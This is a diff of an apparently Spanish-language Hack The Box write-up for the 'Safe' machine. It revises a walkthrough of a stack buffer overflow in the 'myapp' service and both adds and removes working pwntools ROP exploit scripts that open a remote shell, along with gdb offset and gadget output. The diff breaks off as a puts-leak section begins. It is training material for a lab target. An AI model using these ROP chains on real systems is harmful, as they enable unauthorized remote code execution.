@@ -151,11 +151,6 @@ PORT     STATE SERVICE
 1337/tcp open  waste</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque es completamente innecesario, solo por comodidad agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> el dominio <code class="language-plaintext highlighter-rouge">safe.htb</code> para que al apuntar a el nos lleve a la ip victima</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">"10.10.10.147 safe.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
-</code></pre></div></div><br>
-
 <p class="plain-text">Al abrir el servicio web encontramos la plantilla por defecto de <code class="language-plaintext highlighter-rouge">apache2</code> en debian</p>
 <a href="/hackthebox/safe/1.png" target="_blank"><div><p><img src="/hackthebox/safe/1.png"></p></div></a>
 
@@ -164,7 +159,7 @@ PORT     STATE SERVICE
 
 <p class="plain-text">El binario de <code class="language-plaintext highlighter-rouge">myapp</code> podemos descargarlo directamente de la pagina web en <code class="language-plaintext highlighter-rouge">/myapp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s http://safe.htb/myapp -o myapp  </span>
+<code><span class="ve">❯ curl </span><span class="p">-s http://10.10.10.147/myapp -o myapp  </span>
 </code></pre></div></div><br>
 
 </section>
@@ -179,29 +174,15 @@ PORT     STATE SERVICE
 What do you want me to echo back? test
 test
 
-</span><span class="ve">❯ netcat </span><span class="p">safe.htb 1337
+</span><span class="ve">❯ netcat </span><span class="p">10.10.10.147 1337
  19:33:52 up 9 min,  0 users,  load average: 0.00, 0.00, 0.00  
 
 What do you want me to echo back? test
 test</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> podemos decompilar el binario y de esta manera ver su codigo en <code class="language-plaintext highlighter-rouge">C</code></p>
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">IDA</code> podemos desensamblar el binario, la función <code class="language-plaintext highlighter-rouge">main</code> inicia ejecutando el comando <code class="language-plaintext highlighter-rouge">uptime</code> con <code class="language-plaintext highlighter-rouge">system</code>, luego de ello muestra un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> para posteriormente recibir un buffer con <code class="language-plaintext highlighter-rouge">gets</code>, el primer argumento en <code class="language-plaintext highlighter-rouge">rdi</code> es el puntero a un buffer en <code class="language-plaintext highlighter-rouge">rbp-112</code> donde se escribiran los datos y el segundo en <code class="language-plaintext highlighter-rouge">rsi</code> la cantidad de bytes a recibir, en este caso son <code class="language-plaintext highlighter-rouge">1000</code>, mas de los que el buffer de <code class="language-plaintext highlighter-rouge">112</code> espera</p>
 <a href="/hackthebox/safe/3.png" target="_blank"><div><p><img src="/hackthebox/safe/3.png"></p></div></a>
-
-<p class="plain-text">El codigo es simple, ejecuta con system el comando <code class="language-plaintext highlighter-rouge">uptime</code>, despues recibe un input con <code class="language-plaintext highlighter-rouge">gets</code> y lo devuelve con <code class="language-plaintext highlighter-rouge">puts</code>, este binario es vulnerable y es que define un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">112</code> bytes para recibir un input con la funcion vulnerable gets</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int </span><span class="p">__fastcall </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
-{
-  </span><span class="no">char </span><span class="p">string[</span><span class="mi">112</span><span class="p">]; </span><span class="c1">// [rsp+0h] [rbp-70h] BYREF
-
-  </span><span class="no">system</span><span class="p">(</span><span class="s">"/usr/bin/uptime"</span><span class="p">);
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">What do you want me to echo back? "</span><span class="p">);
-  </span><span class="no">gets</span><span class="p">(string, </span><span class="mi">1000</span><span class="no">LL</span><span class="p">);
-  </span><span class="no">puts</span><span class="p">(string);
-  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-}</span>
-</code></pre></div></div><br>
 
 <p class="plain-text">Antes de explotar el buffer overflow miraremos las protecciones, <code class="language-plaintext highlighter-rouge">NX</code> esta habilitado, lo que quiere decir que no podremos simplemente ejecutar <code class="language-plaintext highlighter-rouge">shellcode</code> en la pila</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -214,84 +195,46 @@ test</span>
     PIE:      </span><span class="ro">No PIE (0x400000)  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">En este caso necesitamos indicar que al corromper el programa nos interesa seguir al proceso <code class="language-plaintext highlighter-rouge">padre</code>, iniciaremos creando un patron especial de <code class="language-plaintext highlighter-rouge">150</code> caracteres</p>
+<p class="plain-text">Sabemos que el buffer definido está en <code class="language-plaintext highlighter-rouge">rbp - 112</code> por lo que podemos llenar ese buffer con <code class="language-plaintext highlighter-rouge">A's</code>, luego enviar <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño de un <code class="language-plaintext highlighter-rouge">qword</code> o registro de <code class="language-plaintext highlighter-rouge">x64</code> con <code class="language-plaintext highlighter-rouge">B's</code> y <code class="language-plaintext highlighter-rouge">C's</code>, las <code class="language-plaintext highlighter-rouge">B's</code> seran el valor despues de <code class="language-plaintext highlighter-rouge">rbp - 112</code> por lo que <code class="language-plaintext highlighter-rouge">rbp</code> deberia tomar ese valor y el resto de bytes se escribiran después de <code class="language-plaintext highlighter-rouge">rbp</code> en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> b"A" * 112 + b"B" * 8 + b"C" * 8
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC'  
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este caso necesitamos indicar que al corromper el programa nos interesa seguir al proceso <code class="language-plaintext highlighter-rouge">padre</code>, al enviar nuestro payload podemos ver que después de llenar el buffer con las <code class="language-plaintext highlighter-rouge">112 A's</code>, el registro <code class="language-plaintext highlighter-rouge">rbp</code> ha tomado el valor de las <code class="language-plaintext highlighter-rouge">8 B's</code> y el siguiente <code class="language-plaintext highlighter-rouge">qword</code> de las <code class="language-plaintext highlighter-rouge">C's</code> se ha escrito en el stack como la dirección de retorno, sabemos que necesitamos <code class="language-plaintext highlighter-rouge">112</code> bytes para sobrescribir <code class="language-plaintext highlighter-rouge">rbp</code> pero <code class="language-plaintext highlighter-rouge">120</code> para el retorno</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q myapp
 Reading symbols from </span><span class="ve">myapp</span><span class="p">...
 (No debugging symbols found in </span><span class="ve">myapp</span><span class="p">)
 </span><span class="ro">pwndbg> </span><span class="p">set follow-fork-mode parent
-</span><span class="ro">pwndbg> </span><span class="p">cyclic 150
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa  
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Al correr el programa nos pedira un <code class="language-plaintext highlighter-rouge">input</code>, le pasamos el patron de caracteres creado por gdb para asi buscar el <code class="language-plaintext highlighter-rouge">offset</code>, al enviarlo el programa se corrompe</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">run
+</span><span class="ro">pwndbg> </span><span class="p">run
 Starting program: </span><span class="ve">/home/kali/myapp</span><span class="p">
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
  20:34:33 up  1:23,  1 user,  load average: 0,54, 0,57, 0,58
 
-What do you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa  
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
+What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
 
 Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x00000000004011ac </span><span class="p">in </span><span class="am">main</span><span class="p"> ()
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ahora podemos buscar el <code class="language-plaintext highlighter-rouge">offset</code>, que es la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> que podemos enviar antes de que el programa sobreescriba la siguiente instruccion de <code class="language-plaintext highlighter-rouge">retorno</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
-</span><span class="az">0x7fffffffe588</span><span class="p">:	0x6161616161616170
-</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6161616161616170
-</span><span class="sa">Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)  
-</span><span class="ve">Found at offset 120
-</span><span class="ro">pwndbg></span>
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+$1 = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffe438</span><span class="p">:	0x4343434343434343
+</span><span class="ro">pwndbg> </span>
 </code></pre></div></div><br>
 
 </section>
 <section class="post" id="bof-function">
 <br><h3 class="post-title">Buffer Overflow - Function</h3><br>
 
-<p class="plain-text">Hay diferentes formas de explotarlo, la primera es a través de una funcion <code class="language-plaintext highlighter-rouge">test</code> existente en el binario, con <code class="language-plaintext highlighter-rouge">info functions</code> podemos ver su direccion</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">info functions ^test$
-All functions matching regular expression "^test$":  
+<p class="plain-text">Hay diferentes formas de explotarlo, la primera es a través de una funcion <code class="language-plaintext highlighter-rouge">test</code> existente en el binario en la dirección <code class="language-plaintext highlighter-rouge">0x401152</code>, este ejecuta un <code class="language-plaintext highlighter-rouge">push</code> del valor de <code class="language-plaintext highlighter-rouge">rbp</code> y luego mueve a <code class="language-plaintext highlighter-rouge">rbp</code> la dirección del stack para guardar el puntero del stack en <code class="language-plaintext highlighter-rouge">rdi</code> y saltar a <code class="language-plaintext highlighter-rouge">r13</code>, por lo que si guardamos una función en <code class="language-plaintext highlighter-rouge">r13</code> el primer argumento <code class="language-plaintext highlighter-rouge">rdi</code> tendrá un puntero al valor que contenga <code class="language-plaintext highlighter-rouge">rbp</code> al inicio de la ejecución de <code class="language-plaintext highlighter-rouge">test</code></p>
+<a href="/hackthebox/safe/4.png" target="_blank"><div><p><img src="/hackthebox/safe/4.png"></p></div></a>
 
-Non-debugging symbols:
-</span><span class="az">0x0000000000401152  </span><span class="am">test
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Si lo desensamblamos desde gdb podemos ver sus intrucciones, hace un <code class="language-plaintext highlighter-rouge">MOV</code> de <code class="language-plaintext highlighter-rouge">RSP</code> a <code class="language-plaintext highlighter-rouge">RBP</code>, despues de <code class="language-plaintext highlighter-rouge">RSP</code> a <code class="language-plaintext highlighter-rouge">RDI</code> y finalmente un <code class="language-plaintext highlighter-rouge">JMP</code> hacia el registro <code class="language-plaintext highlighter-rouge">R13</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">disassemble test
-Dump of assembler code for function </span><span class="am">test</span><span class="p">:
-   </span><span class="az">0x0000000000401152</span><span class="p"> <+0>:     </span><span class="ve">push   </span><span class="ro">rbp
-   </span><span class="az">0x0000000000401153</span><span class="p"> <+1>:     </span><span class="ve">mov    </span><span class="ro">rbp</span><span class="p">,</span><span class="ro">rsp  
-   </span><span class="az">0x0000000000401156</span><span class="p"> <+4>:     </span><span class="ve">mov    </span><span class="ro">rdi</span><span class="p">,</span><span class="ro">rsp  
-   </span><span class="az">0x0000000000401159</span><span class="p"> <+7>:     </span><span class="ve">jmp    </span><span class="ro">r13
-   </span><span class="az">0x000000000040115c</span><span class="p"> <+10>:    </span><span class="ve">nop
-   </span><span class="az">0x000000000040115d</span><span class="p"> <+11>:    </span><span class="ve">pop    </span><span class="ro">rbp
-   </span><span class="az">0x000000000040115e</span><span class="p"> <+12>:    </span><span class="ve">ret</span><span class="p">
-End of assembler dump.
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Para aprovecharnos de estas instrucciones antes necesitaremos algunas cosas, primero la direcion de la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> que podemos ver desde gdb</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">plt 
-</span><span class="sa">Section .plt 0x401020-0x401070:</span><span class="p">  
-0x401030: puts@plt
-0x401040: system@plt
-0x401050: printf@plt
-0x401060: gets@plt
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Lo siguiente sera buscar un gadget que ekecite un <code class="language-plaintext highlighter-rouge">POP R13</code> que donde estará la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> aprovechando que la funcion test al final hace un <code class="language-plaintext highlighter-rouge">JMP R13</code>, sin embargo solo encontramos un gadget que nos hace un POP a <code class="language-plaintext highlighter-rouge">R13</code>, <code class="language-plaintext highlighter-rouge">R14</code> y <code class="language-plaintext highlighter-rouge">R15</code></p>
+<p class="plain-text">Lo primero sera buscar un gadget que guarde un valor en <code class="language-plaintext highlighter-rouge">r13</code>, aunque encontramos un <code class="language-plaintext highlighter-rouge">pop r13</code> tambien guarda <code class="language-plaintext highlighter-rouge">2 qwords</code> adicionales que llenaremos con <code class="language-plaintext highlighter-rouge">null</code> bytes</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper</span><span class="p"> --file myapp --search </span><span class="am">"pop r13;"</span><span class="p">
 </span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
@@ -303,41 +246,44 @@ End of assembler dump.
 </span><span class="ro">0x0000000000401206</span><span class="p">: </span><span class="am">pop </span><span class="p">r13</span><span class="az">; </span><span class="am">pop </span><span class="p">r14</span><span class="az">; </span><span class="am">pop </span><span class="p">r15</span><span class="az">; </span><span class="am">ret</span><span class="az">;  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La idea para explotarlo sera enviar <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">RIP</code> restandole los bytes ya que dejaremos la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> al incio de la pila, despues mediante el gadget <code class="language-plaintext highlighter-rouge">POP R13 R14 R15</code> enviar la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> a <code class="language-plaintext highlighter-rouge">R13</code> rellenando los otros registros con <code class="language-plaintext highlighter-rouge">null</code>, despues al llamar a la funcion <code class="language-plaintext highlighter-rouge">test</code> ejecutara un <code class="language-plaintext highlighter-rouge">MOV RDI,RSP</code> que movera la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> a <code class="language-plaintext highlighter-rouge">RDI</code>, despues cuando test ejecute <code class="language-plaintext highlighter-rouge">JMP R13</code> se encotrara con <code class="language-plaintext highlighter-rouge">system@plt</code> que tomara el argumento de <code class="language-plaintext highlighter-rouge">RDI</code> y nos dara una sh</p>
-<a href="/hackthebox/safe/8.png" target="_blank"><div><p><img src="/hackthebox/safe/8.png"></p></div></a>
+<p class="plain-text">Luego necesitamos el valor de <code class="language-plaintext highlighter-rouge">r13</code> donde saltará la función <code class="language-plaintext highlighter-rouge">test</code>, podemos aprovechar que el binario no tiene <code class="language-plaintext highlighter-rouge">PIE</code> y el simbolo <code class="language-plaintext highlighter-rouge">system</code> se encuentra en él</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">plt 
+</span><span class="sa">Section .plt 0x401020-0x401070:</span><span class="p">  
+0x401030: puts@plt
+0x401040: system@plt
+0x401050: printf@plt
+0x401060: gets@plt
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
 
-<p class="plain-text">Lo unico que nos queda es plasmar la explotacion explicada anteriormente en un script de <code class="language-plaintext highlighter-rouge">python</code>, en este caso haremos uso de pwntools para facilitarlo</p>
+<p class="plain-text">Resumiendo, guardamos la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> en <code class="language-plaintext highlighter-rouge">rbp</code>, luego guardamos <code class="language-plaintext highlighter-rouge">system@plt</code> en <code class="language-plaintext highlighter-rouge">r13</code>, al llamar a <code class="language-plaintext highlighter-rouge">test</code> el puntero a la string en <code class="language-plaintext highlighter-rouge">rbp</code> se guarda en <code class="language-plaintext highlighter-rouge">rdi</code> y salta a <code class="language-plaintext highlighter-rouge">r13</code> por lo que como resultado obtenemos la ejecución de <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64
 
-bin_sh </span><span class="o">= </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.147"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
 
-offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> (offset </span><span class="o">- </span><span class="p">len(bin_sh))
-
-pop_r13_r14_r15 </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401206</span><span class="p">)
-plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
-test </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401152</span><span class="p">)
-null </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0</span><span class="p">)
+offset </span><span class="o">= </span><span class="mi">112</span><span class="p">
+junk </span><span class="o">=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
 payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">bin_sh
-payload </span><span class="o">+= </span><span class="p">pop_r13_r14_r15 </span><span class="o">+ </span><span class="p">plt_system </span><span class="o">+ </span><span class="p">null </span><span class="o">+ </span><span class="p">null  
-payload </span><span class="o">+= </span><span class="p">test
+payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="c1"> # rbp value</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">p64(</span><span class="mi">0x401206</span><span class="p">)</span><span class="c1">  # pop r13; pop r14; pop r15; ret;  </span><span class="p">
+payload </span><span class="o">+= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)</span><span class="c1">  # system()</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">p64(</span><span class="mi">0x0</span><span class="p">) </span><span class="o">*</span><span class="mi"> 2</span><span class="c1">   # padding for pops</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">p64(</span><span class="mi">0x401152</span><span class="p">)</span><span class="c1">  # test()</span><span class="p">
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
-
-shell.recvline()
 shell.sendline(payload)
+shell.recvline()
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al ejecutar el script se conecta a la maquina victima por el puerto <code class="language-plaintext highlighter-rouge">1337</code> y al explotar el <code class="language-plaintext highlighter-rouge">buffer overflow</code> nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">user</code>, leemos la flag</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.147 on port 1337: Done  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">whoami
 user
@@ -401,7 +347,7 @@ nth paddr        size vaddr       vsize perm name
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Tambien necesitaremos un gadget que haga un <code class="language-plaintext highlighter-rouge">POP RDI</code> para enviar la direccion <code class="language-plaintext highlighter-rouge">writable</code> como argumento en las funciones que utilizaremos para explotarlo</p>
+<p class="plain-text">Tambien necesitaremos un gadget que ejecute un <code class="language-plaintext highlighter-rouge">pop rdi</code> para enviar la direccion <code class="language-plaintext highlighter-rouge">.data</code> como argumento en las funciones que utilizaremos para explotarlo, primero a <code class="language-plaintext highlighter-rouge">gets</code> para recibir la string y luego a <code class="language-plaintext highlighter-rouge">system</code> para ejecutar esa string en el sistema</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper </span><span class="p">--file myapp --search </span><span class="am">"pop rdi; ret;"</span><span class="p">  
 </span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
@@ -410,46 +356,39 @@ nth paddr        size vaddr       vsize perm name
 </span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;
 
 </span><span class="ve">[INFO] </span><span class="p">File: myapp
-</span><span class="ro">0x000000000040120b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">RIP</span><span class="az">;</span>
+</span><span class="ro">0x000000000040120b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La idea esta vez sera rellenas con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al registro RIP, despues con un <code class="language-plaintext highlighter-rouge">POP RDI</code> enviaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">writable</code>, despues llamamos a <code class="language-plaintext highlighter-rouge">gets@plt</code> y nos pedira un input, este sera la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> que se escribira en <code class="language-plaintext highlighter-rouge">RDI</code>, despues nuevamente enviamos a RDI la direccion <code class="language-plaintext highlighter-rouge">writable</code> y llamamos a <code class="language-plaintext highlighter-rouge">system@plt</code>, al ejecutar esta funcion tomara el argumento del registro <code class="language-plaintext highlighter-rouge">RDI</code> la cual contiene la direccion de writable que vale <code class="language-plaintext highlighter-rouge">/bin/sh</code> y nos ejecutara una shell</p>
-<a href="/hackthebox/safe/11.png" target="_blank"><div><p><img src="/hackthebox/safe/11.png"></p></div></a>
-
-<p class="plain-text">Nuevamente plasmamos esta idea en un script de <code class="language-plaintext highlighter-rouge">python</code> usando las pwntools</p>
+<p class="plain-text">La primera parte del exploit llama a <code class="language-plaintext highlighter-rouge">gets</code> guardando la entrada en la sección <code class="language-plaintext highlighter-rouge">.data</code>, aqui enviaremos la string <code class="language-plaintext highlighter-rouge">/bin/sh</code>, luego llamamos a <code class="language-plaintext highlighter-rouge">system</code> pasandole la direccion de <code class="language-plaintext highlighter-rouge">.data</code> como argumento, de esta forma obtenemos un <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64
 
-offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.147"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
 
-bin_sh </span><span class="o">= </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">
+offset </span><span class="o">=</span><span class="mi"> 120</span><span class="p">
+junk </span><span class="o">=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
-writable </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404038</span><span class="p">)
-plt_gets </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401060</span><span class="p">)
-plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
+payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> junk
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40120b</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x404038</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x401060</span><span class="p">)</span><span class="c1"> # gets()</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40120b</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x404038</span><span class="p">)</span><span class="c1"> # .data</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x401040</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
 
-payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">writable
-payload </span><span class="o">+= </span><span class="p">plt_gets
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">writable
-payload </span><span class="o">+= </span><span class="p">plt_system
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)  
+shell.sendline(payload)
+shell.sendline(</span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
 
 shell.recvline()
-shell.sendline(payload)
-shell.sendline(bin_sh)
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al ejecutarlo explota el buffer overflow y nos otorna una shell como el usuario <code class="language-plaintext highlighter-rouge">user</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.147 on port 1337: Done  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">whoami
 user
@@ -464,7 +403,7 @@ c15**************************ef9
 <section class="post" id="bof-puts">
 <br><h3 class="post-title">Buffer Overflow - Puts</h3><br>
 
-<p class="plain-text">Otra forma es a través de un <code class="language-plaintext highlighter-rouge">error</code> del systema al ejecutar <code class="language-plaintext highlighter-rouge">puts</code>, la idea sera obtener la direccion de <code class="language-plaintext highlighter-rouge">puts@got.plt</code> que podemos obtener facilmente con gdb</p>
+<p class="plain-text">Otra forma es a través del <code class="language-plaintext highlighter-rouge">output</code> del sistema, la idea sera obtener la direccion de <code class="language-plaintext highlighter-rouge">puts@got</code> la cual deberia ser una referencia a <code class="language-plaintext highlighter-rouge">puts@libc</code> por lo que tendriamos una dirección dentro de <code class="language-plaintext highlighter-rouge">libc</code> que podriamos usar para ejecutar otras funciones</p>
